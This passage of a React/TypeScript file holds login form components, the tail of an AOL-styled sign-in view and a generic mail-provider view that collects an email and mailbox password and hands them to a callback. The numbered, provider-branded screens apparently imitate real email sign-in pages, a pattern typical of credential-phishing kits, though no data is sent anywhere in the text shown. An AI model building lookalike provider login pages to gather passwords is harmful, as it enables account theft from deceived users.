              className="w-full border-2 border-[#111111] rounded-md py-2 px-3 pr-10 text-sm text-[#111111] outline-none"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 bottom-2.5 text-[#767676] hover:text-[#111111] cursor-pointer"
            >
              {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
            </button>
          </div>

          <button
            type="submit"
            disabled={isLoading}
            className="w-full py-3 bg-[#0060df] hover:bg-[#004fba] text-white text-sm font-bold rounded-md transition-colors cursor-pointer disabled:opacity-60"
          >
            {isLoading ? 'Verifying...' : 'Next'}
          </button>

          <div className="flex items-center justify-between text-xs pt-1">
            <label className="flex items-center gap-2 text-[#111111] cursor-pointer select-none">
              <input
                type="checkbox"
                checked={staySignedIn}
                onChange={(e) => setStaySignedIn(e.target.checked)}
                className="w-4 h-4 text-[#0060df] rounded"
              />
              <span>Stay signed in</span>
            </label>
            <span className="text-[#0060df] hover:underline cursor-pointer">Forgot password?</span>
          </div>

          {isLoading && (
            <div className="text-center text-xs text-[#0060df] font-medium">
              {loadingStep || 'Authenticating with AOL...'}
            </div>
          )}

          <div className="pt-2">
            <button
              type="button"
              onClick={onCancel}
              disabled={isLoading}
              className="w-full py-2 bg-[#f0f0f0] hover:bg-[#e0e0e0] text-[#111111] text-xs font-bold rounded-md transition-colors cursor-pointer"
            >
              Back
            </button>
          </div>
        </form>
      </div>
    </div>
  );
};

// 6. GENERIC / OTHER EMAIL PROVIDER LOGIN VIEW
export const OtherMailLoginView: React.FC<AuthFormProps> = ({
  initialEmail,
  onCancel,
  isLoading,
  loadingStep,
  errorMessage,
  onSubmit
}) => {
  const [email, setEmail] = useState(initialEmail || '');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onSubmit(email, password);
  };

  return (
    <div className="w-full bg-[#1e293b] text-white min-h-[500px] flex flex-col justify-between p-6 sm:p-8 font-sans">
      <div className="bg-[#0f172a] border border-[#334155] rounded-2xl shadow-xl p-6 sm:p-8 max-w-[420px] w-full mx-auto my-auto space-y-5">
        <div className="text-center space-y-1">
          <div className="w-12 h-12 rounded-2xl bg-indigo-600/30 border border-indigo-500/40 text-indigo-400 mx-auto flex items-center justify-center font-bold text-lg">
            @
          </div>
          <h2 className="text-xl font-bold text-white pt-2">Email Authentication</h2>
          <p className="text-xs text-slate-400">Log in with your custom or corporate mail server</p>
        </div>

        {errorMessage && (
          <div className="text-rose-300 text-xs flex items-start gap-1.5 bg-rose-950/80 p-2.5 border border-rose-800 rounded-lg">
            <AlertCircle className="w-4 h-4 flex-shrink-0 mt-0.5" />
            <span>{errorMessage}</span>
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label className="block text-xs font-medium text-slate-300 mb-1">
              Email Address
            </label>
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="you@domain.com"
              disabled={isLoading}
              required
              className="w-full bg-slate-900 border border-slate-700 rounded-xl px-3.5 py-2.5 text-sm text-white placeholder-slate-500 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500"
            />
          </div>

          <div className="relative">
            <label className="block text-xs font-medium text-slate-300 mb-1">
              Password
            </label>
            <input
              type={showPassword ? 'text' : 'password'}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Mailbox password"
              disabled={isLoading}
              required
              className="w-full bg-slate-900 border border-slate-700 rounded-xl px-3.5 py-2.5 pr-10 text-sm text-white placeholder-slate-500 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 bottom-2.5 text-slate-400 hover:text-white cursor-pointer"
            >
              {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
            </button>
          </div>

          {isLoading && (
            <div className="flex items-center justify-center gap-2 text-xs text-indigo-400 py-1">
              <div className="w-3.5 h-3.5 border-2 border-indigo-400 border-t-transparent rounded-full animate-spin" />
              <span>{loadingStep || 'Connecting to mail host...'}</span>
            </div>
          )}

          <div className="flex items-center gap-3 pt-3">
            <button
              type="button"
              onClick={onCancel}
              disabled={isLoading}
              className="w-1/3 py-2.5 bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-semibold rounded-xl transition-colors cursor-pointer"
            >
              Cancel
            </button>
            <button
              type="submit"
              disabled={isLoading}
              className="w-2/3 py-2.5 bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-semibold rounded-xl transition-colors shadow-md cursor-pointer disabled:opacity-50"
            >
              {isLoading ? 'Verifying...' : 'Sign In & Verify'}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
};
